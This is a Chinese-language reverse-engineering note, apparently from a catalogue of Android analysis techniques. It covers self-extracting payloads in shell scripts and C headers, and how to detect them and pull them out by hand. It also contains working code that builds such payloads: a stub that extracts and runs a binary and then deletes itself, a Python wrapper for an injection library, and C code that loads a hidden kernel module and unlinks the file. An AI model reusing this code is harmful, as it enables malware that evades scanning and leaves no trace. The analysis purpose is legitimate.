# 自解压 Payload 与脚本嵌入

## 场景

APK 或 shell 脚本将二进制负载（.so/.ko/可执行文件）嵌入自身，运行时自解压执行后自毁。常用于绕过文件系统扫描和静态检测。

## 输入信号

- shell 脚本大小异常（>100KB 的非压缩脚本）
- 脚本末尾出现 ELF header 特征 (`\x7FELF`)
- 文件被 `gzip -cd` 管道解码后执行
- 临时目录中出现随机文件名后立即消失

## 模式 1: Shell + 二进制嵌入

```bash
#!/system/bin/sh
# ~~~~~~~~~~~~~~~~~~~~~~~~~
# 正常 shell 脚本段
# ~~~~~~~~~~~~~~~~~~~~~~~~~
folders=($(find /data/ -maxdepth 1 -mindepth 1 -type d))
random_index=$((RANDOM % ${#folders[@]}))
random_folder="${folders[$random_index]}"
unique_name="$(date +%s | sha256sum | base64 | head -c 32)"

# 核心: LINENO 定位脚本自身, sed 截取尾部二进制
sed -n "$((LINENO+1)),$ p" < "$0" | gzip -cd > "${random_folder}/$unique_name"

chmod 700 "$encrypted_file"
# 5 秒后自毁
(sleep 5; rm -f "$encrypted_file") 2>/dev/null &
"$encrypted_file" ${1+"$@"}
res=$?; exit $res
# ↓ LINENO 行以下全是被 gzip 压缩的二进制数据 ↓
<compressed binary data>
```

关键技巧:
- `$LINENO`: 获取当前行号, 精确定位 script/data 边界
- `sed -n "$((LINENO+1)),$ p"`: 截取从下一行到文件末尾的全部内容
- `gzip -cd`: 解压并输出到 stdout, 管道到文件
- 随机目录 + 随机文件名: 躲避路径扫描
- `sleep 5; rm -f`: 延时自毁, 确保进程已启动

```python
# 构建自解压 payload
import gzip, os

script = """#!/system/bin/sh
sed -n "$((LINENO+1)),$ p" < "$0" | gzip -cd > /data/local/tmp/payload
chmod 700 /data/local/tmp/payload
/data/local/tmp/payload; rm -f /data/local/tmp/payload
exit 0
"""

binary = open("libinject.so", "rb").read()
compressed = gzip.compress(binary)

with open("payload.sh", "wb") as f:
    f.write(script.encode())
    f.write(compressed)
os.chmod("payload.sh", 0o755)
```

## 模式 2: C Header 嵌入

```c
// 将 .ko 驱动文件嵌入为 C 头文件
// dev4.14.117.ko.h:
#ifndef DEV_KO_H
#define DEV_KO_H
unsigned char dev_ko[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // ... 整个 .ko 文件作为字节数组嵌入 ...
    0x00, 0x00, 0x00, 0x00
};
unsigned int dev_ko_len = 24680;
#endif
```

```c
// 运行时写盘并加载
#include "dev4.14.117.ko.h"

void load_driver() {
    char path[256];
    sprintf(path, "/data/local/tmp/driver_%d.ko", getpid());
    FILE *fp = fopen(path, "wb");
    fwrite(dev_ko, 1, dev_ko_len, fp);
    fclose(fp);
    chmod(path, 0600);
    // 加载
    init_module(path, "");  // syscall finit_module
    unlink(path);           // 加载后立即删除文件
}
```

## 模式 3: 编译产物加密

```bash
#!/bin/bash
# 编译后自动加密
AA="libs/arm64-v8a/定制魔化绘制.sh"
count=1
mz="SC.sh"

# 生成自解压包装
echo 'folders=($(find /data/...)); ...; sed -n "$((LINENO+1)),$ p" < "$0" | gzip -cd > ...' > "$count$mz"

# 压缩原始 so 并追加
gzip < "$AA" >> "$count$mz"

# 添加注释层 (干扰静态分析)
{
    printf "# Auto-generated encrypted payload -- do not modify\n"
    cat "$count$mz"
} > "加密后类心文件.sh"
```

## 手动提取

```bash
# 从自解压脚本中手动提取 payload
# 定位边界行 (sed -n 那行的下一行)
tail -n +N payload.sh | gzip -cd > extracted.bin
file extracted.bin  # 确认是 ELF/.so/.ko
```

## 攻击链

```
获取脚本文件 → strings 检查 gzip/magic → 定位 sed -n 边界行
→ 手动解压: tail -n +<LINENO+1> payload.sh | gzip -cd > extracted.bin
→ file extracted.bin 确认是 ELF/.so/.ko → 静态分析提取的二进制
→ 逆向解密/加载/通信逻辑
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击链步骤：

| 攻击链步骤 | MCP 工具 | 说明 |
|-----------|---------|------|
| 检测自解压 payload 类型 | `die_scan` | 检测自解压 payload 类型 |
| 从解压 buffer 中 carve PE/DEX | `carve_payloads_from_dump` | 从解压 buffer 中 carve PE/DEX |

## 证据与验证闭环

- 记录 APK/SO 的 SHA256、包名、版本、ABI、设备/Android/Frida 版本及原始样本路径。
- 静态结论必须绑定类名、方法签名、RVA/文件偏移、字符串或 Xref；动态结论绑定 hook 点、参数、返回值和时间戳。
- 在未修改样本与实验副本上分别复现，保存 Frida 日志、dump 哈希和重放脚本到 `exports/android/`。
- Patch/重打包必须记录原始字节、修改字节、签名方式和安装启动结果，不能以“构建成功”代替行为验证。
